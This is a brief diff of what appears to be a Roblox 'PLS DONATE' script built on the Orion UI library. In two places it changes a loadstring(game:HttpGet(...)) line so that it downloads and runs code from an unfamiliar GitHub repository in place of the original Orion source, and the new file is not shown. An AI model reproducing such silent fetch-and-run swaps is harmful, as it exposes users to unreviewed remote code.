@@ -1,4 +1,4 @@
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/stevenaintoktod/sigma/main/raw.lua')))()
 
 local Window = OrionLib:MakeWindow({Name = "PLS DONATE", HidePremium = true, SaveConfig = false, IntroEnabled = false, ConfigFolder = "OrionTest"})
 
@@ -1158,7 +1158,7 @@ end
 Tab2:AddButton({
 	Name = "DestroyGui",
 	Callback = function()
-      		local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+      		local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/stevenaintoktod/sigma/main/raw.lua')))()
             OrionLib:Destroy()
   	end    
 })
